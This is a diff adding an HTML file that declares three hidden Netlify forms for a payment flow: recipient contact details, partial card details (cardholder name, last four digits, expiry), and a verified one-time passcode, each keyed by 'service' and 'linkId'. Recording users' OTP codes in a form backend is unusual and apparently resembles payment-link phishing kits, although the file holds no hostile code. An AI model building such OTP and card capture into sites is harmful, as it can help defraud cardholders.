@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Netlify Forms</title>
+</head>
+<body>
+  <!-- Payment Recipient Form -->
+  <form name="payment-recipient" netlify netlify-honeypot="bot-field" hidden>
+    <input type="text" name="name" />
+    <input type="email" name="email" />
+    <input type="tel" name="phone" />
+    <input type="text" name="service" />
+    <input type="text" name="amount" />
+    <input type="text" name="linkId" />
+  </form>
+
+  <!-- Payment Card Form -->
+  <form name="payment-card" netlify netlify-honeypot="bot-field" hidden>
+    <input type="text" name="cardholderName" />
+    <input type="text" name="cardLast4" />
+    <input type="text" name="expiryMonth" />
+    <input type="text" name="expiryYear" />
+    <input type="text" name="service" />
+    <input type="text" name="paymentId" />
+    <input type="text" name="linkId" />
+  </form>
+
+  <!-- Payment OTP Verified Form -->
+  <form name="payment-otp-verified" netlify netlify-honeypot="bot-field" hidden>
+    <input type="text" name="otp" />
+    <input type="text" name="service" />
+    <input type="text" name="paymentId" />
+    <input type="text" name="linkId" />
+    <input type="text" name="status" />
+  </form>
+</body>
+</html>
